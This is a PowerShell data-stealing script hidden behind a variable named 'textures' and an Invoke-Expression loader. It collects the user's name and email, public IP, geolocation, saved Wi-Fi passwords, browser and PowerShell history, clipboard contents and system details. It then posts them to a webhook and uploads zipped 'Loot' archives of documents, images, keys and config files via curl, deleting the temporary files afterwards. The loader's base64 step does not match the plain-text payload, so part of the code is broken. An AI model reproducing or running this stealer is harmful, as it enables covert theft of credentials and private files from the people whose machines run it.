$textures = "$whuri = $dc;$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full");$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim();$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content;$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1};$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim();$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress ;$computerSystem = Get-CimInstance CIM_ComputerSystem;$computerBIOS = Get-CimInstance CIM_BIOSElement;$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List;$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List;$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List;$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)};$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table;$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution;$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; };$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table;$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine;$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'};$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize;$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion;$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name;$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0];$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw;Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start();while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100};$Geolocate.Position.Location | Select Latitude,Longitude;Clear-Host;$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()};$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;};$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History";$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique;$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}};$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History";$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique;$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}};$outpath = "$env:temp\systeminfo.txt";"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII;"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append;"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append;"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append;"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append;"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append;"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append;"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append;($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Appen;"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append;"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Drivers            : $drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append;"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append;"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append;"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;(Get-Clipboard | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append;"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append;($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append;$Pathsys = $outpath;$escmsgsys = "SYSTEM INFO";$jsonsys = @{"username" ="$env:COMPUTERNAME";"content" = $escmsgsys;file1 = @($Pathsys)} | ConvertTo-Json;Start-Sleep 1;Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys;curl.exe -F file1=@"$Pathsys" $whuri;Remove-Item -Path $Pathsys -force;Function Exfiltrate { param ([string[]]$FileType,[string[]]$Path);$maxZipFileSize = 25MB;$currentZipSize = 0;$index = 1;$zipFilePath ="$env:temp/Loot$index.zip";If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}If($FileType -ne $null){$fileExtensions = @($FileType)}else {$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.heic", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")};Add-Type -AssemblyName System.IO.Compression.FileSystem;$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create');foreach ($folder in $foldersToSearch) {foreach ($extension in $fileExtensions) {$files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse;foreach ($file in $files) {$fileSize = $file.Length;if ($currentZipSize + $fileSize -gt $maxZipFileSize) {$zipArchive.Dispose();$currentZipSize = 0;curl.exe -F file1=@"$zipFilePath" $whuri;Remove-Item -Path $zipFilePath -Force;Sleep 1;$index++;$zipFilePath ="$env:temp/Loot$index.zip";$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')};$entryName = $file.FullName.Substring($folder.Length + 1);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName);$currentZipSize += $fileSize}}}$zipArchive.Dispose();curl.exe -F;file1=@"$zipFilePath" $whuri;Remove-Item -Path $zipFilePath -Force};Exfiltrate
"; $loadTextures = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($textures))
Invoke-Expression $loadTextures